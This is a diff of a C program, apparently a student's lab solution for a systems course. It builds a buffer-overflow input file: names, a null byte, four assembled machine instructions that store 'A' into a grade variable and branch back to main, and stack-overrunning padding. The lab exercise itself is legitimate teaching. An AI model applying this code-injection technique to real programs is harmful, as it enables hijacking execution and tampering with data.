@@ -13,41 +13,47 @@
 #include "miniassembler.h"
 
 int main(void) {
-    FILE *dataA ;
-    fopen("dataA", "w+");
-
-    /* create a file pointer and iterator variable */
+   /* create a file pointer and iterator variable */
    FILE *dataA;
 
+   /* Create a variable for the payload address */
+   unsigned int payloadAddress;
+
+   /* Create variables for the instructions */
+   unsigned int movInstr;
+   unsigned int strbInstr;
+   unsigned int bInstr;
+   
    /* open the file */
-   dataA = fopen("dataB", "w+");
+   dataA = fopen("dataA", "w+");
 
    /* write names to file */ 
-   fprintf(dataA, "Alex Delistathis & Matthew Zhang");
+   fprintf(dataA, "Alex Delistathis/Matt Zhang");
 
    /* write null byte to file */
    putc('\0', dataA);
+
+   /* Calculate the address where the payload will be loaded */
+   payloadAddress = MiniAssembler_adr(0, 0x420044, 0x420074);
+   fwrite(&payloadAddress, sizeof(unsigned int), 1, dataA);
+
+   /* Move 'A' into a register */
+   movInstr = MiniAssembler_mov(1, 65); 
+   fwrite(&movInstr, sizeof(unsigned int), 1, dataA);
+
+   /* Store 'A' into the grade variable */
+   strbInstr = MiniAssembler_strb(1, 0);
+   fwrite(&strbInstr, sizeof(unsigned int), 1, dataA);
+
+   /* Branch back to main function after getName */
+   bInstr = MiniAssembler_b(0x420080, 0x40087c);
+   fwrite(&bInstr, sizeof(unsigned int), 1, dataA);
+
+   /* add padding to overrun the stack */
+   fprintf(dataA, "%s", "anggg");
    
-   /* overrun the stack */
-   fprintf(dataA, "%s", "angangangangang");
-
-    /* Calculate the address where the payload will be loaded */
-    unsigned int payloadAddress = /* payload address */;
-    fwrite(&payloadAddress, sizeof(unsigned int), 1, dataA);
-
-    /* Move 'A' into a register */
-    unsigned int movInstr = MiniAssembler_mov(0, 65); 
-    fwrite(&movInstr, sizeof(unsigned int), 1, dataA);
-
-    /* Store 'A' into the grade variable */
-    unsigned int strbInstr = MiniAssembler_strb(0, /* reg for 0x420044 */);
-    fwrite(&strbInstr, sizeof(unsigned int), 1, dataA);
-
-    /* Branch back to main function after getName */
-    unsigned int bInstr = MiniAssembler_b(0x400878, /* current address*/);
-
-    fwrite(&bInstr, sizeof(unsigned int), 1, dataA);
-
-    fclose(dataA);
-    return 0;
+   /* close the file */
+   fclose(dataA);
+   
+   return 0;
 }
